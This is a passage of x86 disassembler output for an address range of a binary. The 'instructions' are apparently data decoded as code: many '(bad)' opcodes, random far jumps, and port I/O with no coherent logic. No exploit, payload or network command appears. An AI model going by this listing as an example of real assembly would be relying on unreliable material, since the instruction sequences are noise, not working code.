  428069:	mov    WORD PTR [esp+ecx*2],gs
  42806c:	das    
  42806d:	xchg   ecx,eax
  42806e:	ret    0x773e
  428071:	cmp    al,0x4c
  428073:	sub    DWORD PTR [edi+esi*2],esi
  428076:	retf   0xb4b6
  428079:	(bad)  
  42807a:	cdq    
  42807b:	push   0x16
  42807d:	pop    ecx
  42807e:	aaa    
  42807f:	repnz inc ebp
  428081:	inc    ebp
  428082:	adc    DWORD PTR [ebp+eiz*4-0x3d],ebx
  428086:	into   
  428087:	ss adc al,0x97
  42808a:	scas   al,BYTE PTR es:[edi]
  42808b:	sub    dh,BYTE PTR [esi-0x8]
  42808e:	repz and al,0x78
  428091:	je     0x4280d7
  428093:	pop    edx
  428094:	xchg   ebx,eax
  428095:	sub    ebp,edx
  428097:	dec    ebx
  428098:	jl     0x428053
  42809a:	jle    0x4280b6
  42809c:	ss and eax,0xc179cc80
  4280a2:	into   
  4280a3:	sub    BYTE PTR gs:[ebp-0x7b],cl
  4280a7:	and    BYTE PTR [eax+0x4b],0x5f
  4280ab:	sub    eax,0xd4673768
  4280b0:	or     esi,0xffffffa8
  4280b3:	xor    eax,0x77570ea6
  4280b8:	movq   mm6,QWORD PTR [esi+0x77]
  4280bc:	mov    esi,0x22a76a11
  4280c1:	test   BYTE PTR [ebp-0x7b],0x8d
  4280c5:	add    eax,0xf0ec683a
  4280ca:	add    DWORD PTR [esi+esi*4-0x64f45e3],0xffffffed
  4280d2:	call   0x2f0b1936
  4280d7:	cmc    
  4280d8:	sbb    eax,0x5aeee20a
  4280dd:	nop
  4280de:	lods   al,BYTE PTR ds:[esi]
  4280df:	push   ebp
  4280e0:	dec    esp
  4280e1:	ds pop esi
  4280e3:	push   0xcf61cfd8
  4280e8:	xlat   BYTE PTR ds:[ebx]
  4280e9:	mov    eax,0xb53ea833
  4280ee:	mov    cl,0x92
  4280f0:	push   edi
  4280f1:	cdq    
  4280f2:	jns    0x428155
  4280f4:	xchg   edx,ecx
  4280f6:	sti    
  4280f7:	cld    
  4280f8:	xor    dl,BYTE PTR [ebx-0x5c3c690]
  4280fe:	xchg   edi,eax
  4280ff:	rcl    BYTE PTR [esi],0x98
  428102:	dec    edx
  428103:	in     al,0x32
  428105:	xor    ebp,DWORD PTR [ecx-0x3a]
  428108:	cwde   
  428109:	(bad)  
  42810a:	push   ds
  42810b:	shl    BYTE PTR [edi-0x19],1
  42810e:	cmc    
  42810f:	sbb    eax,0xf8a8706e
  428114:	cdq    
  428115:	fist   WORD PTR [esi+0x2eaf731d]
  42811b:	push   edx
  42811c:	(bad)  
  42811d:	push   ds
  42811e:	sub    al,0x51
  428120:	inc    edi
  428121:	sub    BYTE PTR [ecx-0x5fed2cfb],dl
  428127:	pop    esi
  428128:	div    DWORD PTR [ebp-0x7f]
  42812b:	icebp  
  42812c:	out    0x70,al
  42812e:	test   BYTE PTR [edi-0x2d359db9],dl
  428134:	outs   dx,DWORD PTR ds:[esi]
  428135:	sub    eax,0xa1cf1a50
  42813a:	add    al,0xb5
  42813c:	xchg   DWORD PTR [edi-0x59],esi
  42813f:	test   ch,dh
  428141:	ins    DWORD PTR es:[edi],dx
	...
  4281b2:	add    BYTE PTR [eax],al
  4281b4:	push   ds
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0xf7fdb14f
  4281c3:	dec    BYTE PTR [edx-0x9fffe56]
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    dl,dl
  4281cd:	nop
  4281ce:	in     eax,0x59
  4281d0:	adc    DWORD PTR [ebx-0x1a],ebx
  4281d3:	xchg   ebx,eax
  4281d4:	int3   
  4281d5:	mov    al,ds:0x7a2111f9
  4281da:	adc    DWORD PTR [edx+0x5a85cd0a],edi
  4281e0:	(bad)  
  4281e1:	loopne 0x428202
  4281e3:	ins    DWORD PTR es:[edi],dx
  4281e4:	add    eax,0xead69d76
  4281e9:	daa    
  4281ea:	mov    dl,0xe
  4281ec:	out    0xf2,al
  4281ee:	inc    esp
  4281ef:	dec    eax
  4281f0:	mov    DWORD PTR [edi+edi*8+0x28],esp
  4281f4:	stos   BYTE PTR es:[edi],al
  4281f5:	sbb    dl,BYTE PTR [eax+0x39]
  4281f8:	lea    ebp,[edi+0x2c]
  4281fb:	jns    0x428235
  4281fd:	xchg   DWORD PTR [eax-0x3f047077],esp
  428203:	out    dx,al
  428204:	aaa    
  428205:	jp     0x428217
  428207:	cmp    al,0x17
  428209:	pop    ebx
  42820a:	fisubr WORD PTR [eax+0x6b]
  42820d:	pop    esp
  42820e:	fcomp  DWORD PTR [edi-0x1f22ef02]
  428214:	scas   al,BYTE PTR es:[edi]
  428215:	mov    ebx,0xddd80ae0
  42821a:	retfw  0x82ee
  42821e:	aad    0x68
  428220:	fild   DWORD PTR [edi]
  428222:	(bad)  
  428223:	fmul   DWORD PTR [ebx]
  428225:	mov    ch,0x17
  428227:	into   
  428228:	ja     0x42822f
  42822a:	(bad)  
  42822b:	jl     0x4281b6
  42822d:	cmp    eax,0x2d6f8d7c
  428232:	lea    edi,[edx+0x473fa234]
  428238:	or     ecx,DWORD PTR [ecx+eax*8+0xa]
  42823c:	xchg   BYTE PTR [eax-0x7c],al
  42823f:	inc    ecx
  428240:	repnz lds ebp,FWORD PTR gs:[eax-0x1320f0c2]
  428248:	repz das 
  42824a:	or     eax,0x251a6941
  42824f:	shr    dl,1
  428251:	xchg   ecx,eax
  428252:	lahf   
  428253:	sub    eax,0xa6abfc2b
  428258:	push   eax
  428259:	retf   0x88e0
  42825c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42825d:	push   eax
  42825e:	pop    ss
  42825f:	jno    0x42829f
  428261:	mov    esi,0x569f2f7f
  428266:	out    0xc2,eax
  428268:	pop    ecx
  428269:	cs jmp 0x4282d3
  42826c:	jecxz  0x42821a
  42826e:	inc    ebp
  42826f:	gs xchg ecx,eax
  428271:	fcomp  DWORD PTR [edx]
  428273:	dec    edi
  428274:	sti    
  428275:	inc    ebx
  428276:	mov    ecx,0x519f96f9
  42827b:	shr    DWORD PTR ds:0xa4e247a8,0xcb
  428282:	mov    al,ds:0xe572e43f
  428287:	jl     0x42825e
  428289:	ror    DWORD PTR [ecx+0x601bf3e8],0x7
  428290:	inc    BYTE PTR [ebx+esi*1-0x7bae5a95]
  428297:	or     dl,BYTE PTR [eax-0x6b455aa4]
  42829d:	inc    edx
  42829e:	call   0xfa197076
  4282a3:	xor    edi,edi
  4282a5:	jg     0x428294
  4282a7:	adc    al,0xc7
  4282a9:	aaa    
  4282aa:	push   es
  4282ab:	ret    
  4282ac:	call   ecx
  4282ae:	add    ecx,0xbe5a18bd
  4282b4:	dec    edx
  4282b5:	xchg   ebx,eax
  4282b6:	pop    edx
  4282b7:	rol    DWORD PTR [esi],cl
  4282b9:	scas   al,BYTE PTR es:[edi]
  4282ba:	test   DWORD PTR ds:0x14daed7b,ebp
  4282c0:	add    edx,0x0
	...
  428332:	add    BYTE PTR [eax],al
  428334:	adc    bl,BYTE PTR ds:0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	cmp    BYTE PTR [esi+0x59],ah
  428343:	ins    DWORD PTR es:[edi],dx
  428344:	sub    BYTE PTR [ebx+0xf60001],0x0
  42834b:	add    BYTE PTR [eax-0x4cd0aca9],bh
  428351:	cmc    
  428352:	fnstcw WORD PTR [edi]
  428354:	or     edi,DWORD PTR [ecx]
  428356:	add    dh,ah
  428358:	in     al,dx
  428359:	bound  ebp,QWORD PTR [esi]
  42835b:	adc    ecx,DWORD PTR [ebx+0x61]
  42835e:	fidiv  WORD PTR [esi+0x7a]
  428361:	es aaa 
  428363:	jno    0x428366
  428365:	mov    eax,ecx
  428367:	mov    esp,0x9ece38d8
  42836c:	fld    QWORD PTR [eax]
  42836e:	jb     0x4283a3
  428370:	ins    BYTE PTR es:[edi],dx
  428371:	mov    dl,0x73
  428373:	bswap  edi
  428375:	imul   esi,DWORD PTR [edx],0xe6aca1af
  42837b:	outs   dx,DWORD PTR ds:[esi]
  42837c:	inc    ebp
  42837d:	fsqrt  
  42837f:	mov    edx,0x27ef2098
  428384:	dec    DWORD PTR [ebx+0x47]
  428387:	or     eax,DWORD PTR [ecx+0x30]
  42838a:	mov    ebx,0x75af84d
  42838f:	push   esp
  428390:	dec    eax
  428391:	xor    eax,0x62b3a77a
  428396:	and    BYTE PTR [ebx+ebp*2+0x36],bl
  42839a:	lods   al,BYTE PTR ds:[esi]
  42839b:	in     eax,0xf0
  42839d:	add    BYTE PTR [ebp-0x1bdc9a95],bh
  4283a3:	lods   al,BYTE PTR ds:[esi]
  4283a4:	cmp    BYTE PTR [ecx],bl
  4283a6:	scas   al,BYTE PTR es:[edi]
  4283a7:	rcr    BYTE PTR [edi+0x31],cl
  4283aa:	pop    ebx
  4283ab:	ret    0xcdd9
  4283ae:	loop   0x42841d
  4283b0:	(bad)
  4283b3:	inc    edi
  4283b4:	test   eax,0x33a71ecf
  4283b9:	mov    al,0x7f
  4283bb:	pop    edx
  4283bc:	fwait
  4283bd:	xor    ebp,edi
  4283bf:	clc    
  4283c0:	pop    es
  4283c1:	fistp  DWORD PTR [esi+eax*2-0x485b34be]
  4283c8:	and    eax,0x98d78bf5
  4283cd:	adc    eax,0xaf0166e7
  4283d2:	inc    ebx
  4283d3:	lods   eax,DWORD PTR ds:[esi]
  4283d4:	sub    eax,0xa218136d
  4283d9:	fsub   DWORD PTR [ebp+0x154e2a56]
  4283df:	ja     0x42843d
  4283e1:	mov    ebp,0x2bee2fc7
  4283e6:	retf   
  4283e7:	or     dl,BYTE PTR [edx]
  4283e9:	iret   
  4283ea:	test   BYTE PTR ds:0x9d57e6e9,bh
  4283f0:	jo     0x4283b9
  4283f2:	mov    eax,ds:0x215b2127
  4283f7:	(bad)  
  4283fa:	jecxz  0x4283a5
  4283fc:	mov    eax,DWORD PTR [esi+0xf12cb32]
  428402:	scas   al,BYTE PTR es:[edi]
  428403:	jl     0x42844f
  428405:	and    bh,BYTE PTR [eax]
  428407:	mov    BYTE PTR [ecx-0x1d],cl
  42840a:	cwde   
  42840b:	cmp    BYTE PTR [edi+0xb122bdb],ah
  428411:	dec    esi
  428412:	(bad)  
  428413:	aam    0xf8
  428415:	mov    eax,0x41060e0d
  42841a:	neg    ch
  42841c:	sbb    BYTE PTR [ebx-0x66],0xb6
  428420:	jmp    0x4283cf
  428422:	cmp    al,0x69
  428424:	mov    esp,0xc621e04e
  428429:	mov    ah,0xdf
  42842b:	cmp    eax,0x58b01217
  428430:	repz enter 0x76a5,0x6c
  428435:	js     0x4283e9
  428437:	rcl    DWORD PTR [edx-0x4a15ea0d],0x6f
  42843e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843f:	lea    eax,[ecx+0x90]
	...
  4284b1:	add    BYTE PTR [eax],al
  4284b3:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx+0xd6b3407]
  4284c1:	add    ebp,DWORD PTR [edx+0x1ac76ef]
  4284c7:	add    dh,dh
  4284c9:	add    BYTE PTR [eax],al
  4284cb:	add    cl,bh
  4284cd:	jl     0x4284c8
  4284cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284d0:	lds    edx,FWORD PTR [ebx]
  4284d2:	imul   esi,ebx,0x2a
  4284d5:	push   edi
  4284d6:	mov    esp,DWORD PTR [ebp+eiz*8+0x70]
  4284da:	mov    cl,0x4d
  4284dc:	mov    al,ds:0xbd4ef5da
  4284e1:	mov    ah,0x96
  4284e3:	pop    ebp
  4284e4:	push   edi
  4284e5:	btc    DWORD PTR [ecx],edx
  4284e8:	sub    eax,DWORD PTR [edx+ebp*1-0x4b2b5739]
  4284ef:	into   
  4284f0:	rol    esp,0x22
  4284f3:	cwde   
  4284f4:	popa   
  4284f5:	cmp    eax,0xfad3f3c1
  4284fa:	mov    edi,0x4d901ddf
  4284ff:	lahf   
  428500:	xor    dh,dh
  428502:	push   esi
  428503:	fist   WORD PTR [edx+ebp*2]
  428506:	and    DWORD PTR [ebx-0x4d03540c],ebx
  42850c:	leave  
  42850d:	(bad)  
  42850e:	test   al,0xd9
  428510:	jns    0x428527
  428512:	xchg   DWORD PTR [edx],edx
  428514:	stc    
  428515:	mov    dl,ah
  428517:	in     eax,dx
  428518:	and    bh,BYTE PTR [edi-0xd]
  42851b:	add    DWORD PTR [eax],edx
  42851d:	jnp    0x428538
  42851f:	sub    eax,DWORD PTR ds:[ebp-0x40]
  428523:	inc    edi
  428524:	dec    edx
  428525:	aam    0x27
  428527:	mov    edx,esp
  428529:	inc    esp
  42852a:	push   edx
  42852b:	loop   0x4284c7
  42852d:	xlat   BYTE PTR ds:[ebx]
  42852e:	xchg   edx,eax
  42852f:	jle    0x42855b
  428531:	dec    eax
  428532:	ins    BYTE PTR es:[edi],dx
  428533:	in     al,dx
  428534:	in     al,dx
  428535:	dec    esp
  428536:	push   ds
  428537:	call   DWORD PTR [esi+0x16]
  42853a:	push   ecx
  42853b:	inc    edi
  42853c:	mov    DWORD PTR [eax+eax*4],ebx
  42853f:	nop
  428540:	fadd   st,st(5)
  428542:	aad    0x77
  428544:	imul   esp,DWORD PTR [eax+0x43],0x518bec71
  42854b:	jle    0x4284d2
  42854d:	sub    bl,0xfa
  428550:	inc    edi
  428551:	mov    esp,0xda66a908
  428556:	repnz and DWORD PTR [eax+0x7559a4c9],esi
  42855d:	popf   
  42855e:	call   FWORD PTR [ecx-0x15]
  428561:	dec    edi
  428562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428563:	sbb    esi,ebx
  428565:	fdiv   st,st(7)
  428567:	adc    DWORD PTR [esi+0x66],ecx
  42856a:	mov    bl,0x45
  42856c:	jnp    0x42851d
  42856e:	int3   
  42856f:	mov    BYTE PTR [ebx],bl
  428571:	sub    eax,0x4ebe3094
  428576:	fisub  WORD PTR [eax+eiz*4]
  428579:	shr    BYTE PTR [esi+0x10040d61],0xd8
  428580:	aam    0x38
  428582:	cmp    al,0xd4
  428584:	jne    0x42852d
  428586:	fisubr WORD PTR [eax]
  428588:	popa   
  428589:	fisub  DWORD PTR [eax-0x77]
  42858c:	push   cs
  42858d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42858e:	in     al,dx
  42858f:	es pop edx
  428591:	fistp  DWORD PTR [ebx+0x3f]
  428594:	leave  
  428595:	push   ecx
  428596:	adc    dl,BYTE PTR [eax]
  428598:	ficomp WORD PTR [eax+0x67]
  42859b:	ins    BYTE PTR es:[edi],dx
  42859c:	das    
  42859d:	out    0x39,eax
  42859f:	test   BYTE PTR [ecx-0x75],ah
  4285a2:	test   al,0x55
  4285a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285a5:	fnstenv ds:[ebp-0x75d933ec]
  4285ac:	mov    bh,0xa9
  4285ae:	xchg   dh,dh
  4285b0:	or     DWORD PTR [ebp-0x4553fa7],edx
  4285b6:	cmp    esi,DWORD PTR [edi]
  4285b8:	enter  0xb4b9,0x34
  4285bc:	jo     0x4285b4
  4285be:	xchg   esp,eax
  4285bf:	aaa    
  4285c0:	inc    ebp
  4285c1:	push   cs
	...
  428632:	add    BYTE PTR [eax],al
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	adc    BYTE PTR ds:0xad6c0d82,dl
  428646:	add    DWORD PTR [eax],eax
  428648:	test   BYTE PTR [eax],0x0
  42864b:	add    cl,bh
  42864d:	jmp    0x7d9e0b3e
  428652:	ins    BYTE PTR es:[edi],dx
  428653:	push   edx
  428654:	ss pusha 
  428656:	push   esi
  428657:	je     0x428647
  428659:	sahf   
  42865a:	jmp    0x9b3fc998
  42865f:	lahf   
  428660:	mov    ah,BYTE PTR [eax-0x13de1258]
  428666:	add    esp,eax
  428668:	outs   dx,DWORD PTR ds:[esi]
  428669:	cld    
  42866a:	scas   al,BYTE PTR es:[edi]
  42866b:	jb     0x4286d7
  42866d:	adc    eax,0xdb1cced1
  428672:	mov    WORD PTR [ebx],ss
  428674:	add    ebx,DWORD PTR [edx+esi*1]
  428677:	push   eax
  428678:	pop    esi
  428679:	pop    esp
  42867a:	stos   DWORD PTR es:[edi],eax
  42867b:	cmp    eax,0x8c42a83b
  428680:	and    BYTE PTR [edi+0x4f],ah
  428683:	mov    dl,BYTE PTR ds:0x49f7f567
  428689:	push   0x8309868
  42868e:	fist   WORD PTR [eax-0x1d1f517d]
  428694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428695:	cmp    ch,BYTE PTR [ecx-0x3f]
  428698:	cmp    DWORD PTR [edx],0xffffffe2
  42869b:	call   ecx
  42869d:	js     0x42869c
  42869f:	lahf   
  4286a0:	jmp    0x4286aa
  4286a2:	bound  ecx,QWORD PTR [edx+esi*1+0x21c7cc27]
  4286a9:	ret    0xa8d6
  4286ac:	imul   esp,DWORD PTR [edx],0x3e86aa6d
  4286b2:	mov    edi,DWORD PTR [esi+eiz*4]
  4286b5:	sub    DWORD PTR [ebx-0x2f],edi
  4286b8:	rcl    BYTE PTR [edi-0x64bcd59b],0xd2
  4286bf:	xchg   ah,al
  4286c1:	leave  
  4286c2:	leave  
  4286c3:	mov    eax,0xa3c195df
  4286c8:	sub    BYTE PTR [ecx+ecx*1+0x5a],0x22
  4286cd:	ds pusha 
  4286cf:	lods   eax,DWORD PTR ds:[esi]
  4286d0:	loop   0x428670
  4286d2:	loope  0x42867b
  4286d4:	std    
  4286d5:	xchg   ecx,eax
  4286d6:	fcomp  DWORD PTR [eax-0x7a1addad]
  4286dc:	ret    0x4c07
  4286df:	enter  0x1c36,0x82
  4286e3:	pop    ss
  4286e4:	jp     0x4286fb
  4286e6:	or     eax,0xb1658844
  4286eb:	dec    ebp
  4286ec:	mov    al,0x4c
  4286ee:	jnp    0x4286e6
  4286f0:	aaa    
  4286f1:	or     eax,0xb787ea6a
  4286f6:	ja     0x4286a0
  4286f8:	int3   
  4286f9:	or     al,0xf2
  4286fb:	int3   
  4286fc:	pop    esi
  4286fd:	in     eax,0x83
  4286ff:	pop    edx
  428700:	rcl    BYTE PTR [ebp-0x141213e6],cl
  428706:	xchg   BYTE PTR [ecx],ch
  428708:	mov    dh,0x97
  42870a:	adc    bl,BYTE PTR [ebx-0xa]
  42870d:	dec    ebx
  42870e:	and    DWORD PTR [ebp+0x1],0x6d
  428712:	push   0xbfe998bb
  428717:	cmp    dh,al
  428719:	sub    eax,0xc47f6732
  42871e:	(bad)  
  428720:	mov    al,ds:0x1b304cc3
  428725:	mov    ebp,gs
  428727:	mov    bl,0x7c
  428729:	stc    
  42872a:	imul   eax,DWORD PTR [ebp+0x35],0xa1e3385a
  428731:	sar    edi,1
  428733:	sbb    dl,BYTE PTR [edx]
  428735:	pop    es
  428736:	fidiv  WORD PTR [esi+0x66]
  428739:	mov    WORD PTR [eax-0xaf20eed],fs
  42873f:	inc    ecx
  428740:	cdq    
  428741:	cmp    al,0x0
	...
  4287b3:	add    BYTE PTR [edx],bl
  4287b5:	mov    cl,BYTE PTR [ebx]
  4287b7:	inc    ebp
  4287b8:	fwait
  4287b9:	lds    ebx,FWORD PTR [esi-0x21]
  4287bc:	xor    edi,DWORD PTR [edx-0x119d662]
  4287c2:	mov    esp,0x1ae62b8
  4287c7:	add    dh,dh
  4287c9:	add    BYTE PTR [eax],al
  4287cb:	add    BYTE PTR [edx],ch
  4287cd:	ret    
  4287ce:	and    eax,0x15322e8a
  4287d3:	int3   
  4287d4:	mov    ebp,0xe300044e
  4287d9:	sbb    esi,edi
  4287db:	(bad)  
  4287dc:	fwait
  4287dd:	xor    eax,edx
  4287df:	sti    
  4287e0:	pop    es
  4287e1:	retf   
  4287e2:	inc    ecx
  4287e3:	jo     0x428783
  4287e5:	pop    ecx
  4287e6:	pop    eax
  4287e7:	ficom  DWORD PTR [ebx-0x3d]
  4287ea:	xchg   ebx,eax
  4287eb:	and    al,0x31
  4287ed:	mov    bh,0xc9
  4287ef:	xchg   edx,eax
  4287f0:	mov    ds:0xfa2ab6d0,eax
  4287f5:	inc    ecx
  4287f6:	ret    
  4287f7:	into   
  4287f8:	in     eax,dx
  4287f9:	push   esi
  4287fa:	add    DWORD PTR [ebp+0x545eccc],esi
  428800:	and    DWORD PTR [edi+0x4a0cba37],ebp
  428806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428807:	arpl   WORD PTR [edi],sp
  428809:	or     ch,BYTE PTR [ecx+0x15d62dc3]
  42880f:	inc    esp
  428810:	stos   DWORD PTR es:[edi],eax
  428811:	jnp    0x42880d
  428813:	mov    esi,esp
  428815:	pop    esi
  428816:	add    DWORD PTR [esi+0x2a991a7f],0xa59b24e5
  428820:	inc    edi
  428821:	jp     0x4287e2
  428823:	lds    esi,FWORD PTR [edi+0x28]
  428826:	cs xor al,0x31
  428829:	aas    
  42882a:	ds out dx,al
  42882c:	clc    
  42882d:	inc    ecx
  42882e:	push   0x1c
  428830:	inc    edi
  428831:	or     ecx,ecx
  428833:	inc    esi
  428834:	je     0x42881b
  428836:	push   ebx
  428837:	std    
  428838:	jo     0x42882b
  42883a:	jne    0x4287fa
  42883c:	dec    ecx
  42883d:	sub    dl,BYTE PTR [di+0x30]
  428841:	xchg   ebx,eax
  428842:	sbb    eax,0xaef0f081
  428847:	scas   al,BYTE PTR es:[edi]
  428848:	dec    ecx
  428849:	adc    eax,0x1f53361c
  42884e:	sahf   
  42884f:	jo     0x4288c5
  428851:	pop    ss
  428852:	int3   
  428853:	(bad)  
  428854:	sbb    al,0xe5
  428856:	xchg   ebx,eax
  428857:	int    0x4d
  428859:	sub    eax,0xe10f7579
  42885e:	add    cl,ah
  428860:	sub    BYTE PTR [esi],ah
  428862:	mov    ebp,0x8307e5a
  428867:	mov    al,0x77
  428869:	loope  0x4288e6
  42886b:	dec    esi
  42886c:	push   ebp
  42886d:	and    DWORD PTR [edi+esi*2],ebp
  428870:	scas   eax,DWORD PTR es:[edi]
  428871:	jns    0x4288ed
  428873:	and    al,0x82
  428875:	iret   
  428876:	ss out dx,eax
  428878:	jbe    0x4288f7
  42887a:	pop    esi
  42887b:	nop
  42887c:	shl    BYTE PTR [ebx+0x5ad15572],cl
  428882:	jp     0x4288d3
  428884:	pop    esp
  428885:	jns    0x4288a3
  428887:	ins    DWORD PTR es:[edi],dx
  428888:	pop    edi
  428889:	cs cmp esp,DWORD PTR ds:[ebx]
  42888d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42888e:	(bad)  
  42888f:	sub    eax,0x8ea2d084
  428894:	shr    BYTE PTR [edx-0x6e],cl
  428897:	call   0xdd6ca82a
  42889c:	(bad)  
  42889d:	stc    
  42889e:	js     0x428848
  4288a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4288a1:	xchg   DWORD PTR [edx],esi
  4288a3:	pop    ss
  4288a4:	adc    bl,cl
  4288a6:	pop    ebp
  4288a7:	sbb    dl,bh
  4288a9:	sub    ecx,ebx
  4288ab:	rcl    ebp,cl
  4288ad:	jp     0x428907
  4288af:	ficom  WORD PTR [edx+0x67]
  4288b2:	repnz push edi
  4288b4:	mov    ch,BYTE PTR [edi+0x58]
  4288b7:	bound  ebx,QWORD PTR [ebp+0x7977bfff]
  4288bd:	xor    BYTE PTR [edx-0xe],bl
  4288c0:	inc    ebp
  4288c1:	fadd   DWORD PTR [eax]
	...
  428933:	add    BYTE PTR [edx-0x5c0023],bl
  428939:	mov    ds:0x79f8fdde,eax
  42893e:	ja     0x42892a
  428940:	xor    BYTE PTR [esi+0x2b],ah
  428943:	mov    BYTE PTR [eax-0x51],bl
  428946:	add    DWORD PTR [eax],eax
  428948:	test   BYTE PTR [eax],0x0
  42894b:	add    BYTE PTR [edi],bl
  42894d:	push   ebp
  42894e:	sahf   
  42894f:	mov    dh,0x36
  428951:	(bad)  [ebp+eax*2-0x61]
  428955:	push   eax
  428956:	imul   BYTE PTR es:[edx+0x1e73bf8f]
  42895d:	imul   edi,DWORD PTR [esi+0x12851e35],0x614393be
  428967:	cmp    DWORD PTR [ecx],edx
  428969:	jl     0x42898b
  42896b:	fldenv [ebx+0x3c57d310]
  428971:	adc    ecx,ebx
  428973:	mov    ch,0xe4
  428975:	in     eax,0x81
  428977:	xor    BYTE PTR [edx+0x4c],0xdc
  42897b:	(bad)  
  42897c:	in     al,0x7f
  42897e:	dec    eax
  42897f:	xchg   ebp,eax
  428980:	dec    esp
  428981:	jecxz  0x4289fa
  428983:	xor    BYTE PTR ds:0x4cd9306,al
  428989:	and    BYTE PTR [edi+ecx*2],ah
  42898c:	inc    edx
  42898d:	das    
  42898e:	xchg   ebx,eax
  42898f:	mov    esp,0xea1c5061
  428994:	in     eax,dx
  428995:	js     0x4289e4
  428997:	xchg   esp,eax
  428998:	fs loope 0x42897b
  42899b:	jl     0x428938
  42899d:	adc    ebx,DWORD PTR [ebx]
  42899f:	fld    DWORD PTR [ecx-0x4f]
  4289a2:	ins    DWORD PTR es:[edi],dx
  4289a3:	scas   eax,DWORD PTR es:[edi]
  4289a4:	cmc    
  4289a5:	cmp    ecx,edx
  4289a7:	or     ecx,DWORD PTR [edi+0x5e]
  4289aa:	in     eax,0xdb
  4289ac:	(bad)  
  4289ae:	sar    DWORD PTR ds:0x170848d,0xe0
  4289b5:	sbb    al,0xfd
  4289b7:	sbb    ecx,DWORD PTR [ebp+ebp*2+0x63]
  4289bb:	stos   BYTE PTR es:[edi],al
  4289bc:	mov    ecx,ebx
  4289be:	and    eax,0xc47d8e68
  4289c3:	mov    bh,0xdf
  4289c5:	mul    ecx
  4289c7:	mov    edi,0xf305d233
  4289cc:	sub    ebp,DWORD PTR [ecx+0x3a]
  4289cf:	out    0xb7,al
  4289d1:	in     al,0x1c
  4289d3:	sbb    BYTE PTR ds:0xaed61937,0x5e
  4289da:	mov    esi,0xdf6110f3
  4289df:	push   0xffffffb0
  4289e1:	push   esp
  4289e2:	sbb    eax,0xcdb5f12b
  4289e7:	cmc    
  4289e8:	ror    bh,cl
  4289ea:	inc    ebp
  4289eb:	dec    eax
  4289ec:	mov    al,ds:0xefd9b156
  4289f1:	adc    DWORD PTR [esi+0x2a768c9a],esi
  4289f7:	xchg   ecx,eax
  4289f8:	add    esp,eax
  4289fa:	jg     0x4289e3
  4289fc:	inc    BYTE PTR ds:0x41f0716a
  428a02:	cmp    edx,DWORD PTR [ebx+ecx*1+0x176fc761]
  428a09:	push   esi
  428a0a:	jmp    0x428a2d
  428a0c:	cmp    cl,BYTE PTR [ecx-0x2e]
  428a0f:	lods   eax,DWORD PTR ds:[esi]
  428a10:	dec    esp
  428a11:	jmp    0x24e52c93
  428a16:	mov    BYTE PTR [edi-0x7e],ch
  428a19:	lods   al,BYTE PTR ds:[esi]
  428a1a:	dec    edi
  428a1b:	fidiv  WORD PTR [eax-0x12aa56c4]
  428a21:	je     0x428a74
  428a23:	xor    BYTE PTR [esi],ah
  428a25:	call   0x10df:0x1fc6a71e
  428a2c:	dec    edi
  428a2d:	pop    edx
  428a2e:	out    0x93,al
  428a30:	xor    eax,0x29303bb1
  428a35:	fistp  WORD PTR [ebp-0x52]
  428a38:	inc    esp
  428a39:	loopne 0x428a70
  428a3b:	call   0x37f55cf5
  428a40:	mov    cl,dl
	...
  428ab2:	add    BYTE PTR [eax],al
  428ab4:	retf   0x528b
  428ab7:	jnp    0x428b0c
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0xa0d2f691
  428ac2:	out    0xe4,al
  428ac4:	dec    esi
  428ac5:	mov    al,0x1
  428ac7:	add    dh,dh
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    dh,bl
  428acd:	and    ebp,ecx
  428acf:	cmc    
  428ad0:	ret    0xe39c
  428ad3:	push   eax
  428ad4:	push   es
  428ad5:	pop    ebp
  428ad6:	push   edx
  428ad7:	rep movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  428ada:	pop    esi
  428adb:	cmp    al,0x6d
  428add:	pop    esi
  428ade:	push   edi
  428adf:	sub    ah,0xd6
  428ae2:	dec    edx
  428ae3:	imul   edi,DWORD PTR [esi+ebp*2-0x1f],0xffffff84
  428ae8:	cld    
  428ae9:	lds    edi,FWORD PTR [edi-0x41]
  428aec:	nop
  428aed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428aee:	add    al,0x2
  428af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428af1:	pop    eax
  428af2:	inc    ebx
  428af3:	fsub   QWORD PTR [ebx-0x5e7dd210]
  428af9:	into   
  428afa:	lock stos DWORD PTR es:[edi],eax
  428afc:	push   edi
  428afd:	fidivr DWORD PTR [edx]
  428aff:	dec    esi
  428b00:	test   BYTE PTR [eax+edi*8-0x67],0xb6
  428b05:	sti    
  428b06:	bts    esi,edi
  428b09:	fnstsw WORD PTR [edi-0x10673cee]
  428b0f:	xor    al,0xc3
  428b11:	push   edi
  428b12:	ror    DWORD PTR [ecx-0x2c],cl
  428b15:	or     DWORD PTR [ebp-0x6e],eax
  428b18:	push   edx
  428b19:	mov    ds:0x9181ac71,eax
  428b1e:	test   eax,0x2e1982c7
  428b23:	in     eax,0xbd
  428b25:	sbb    al,0x52
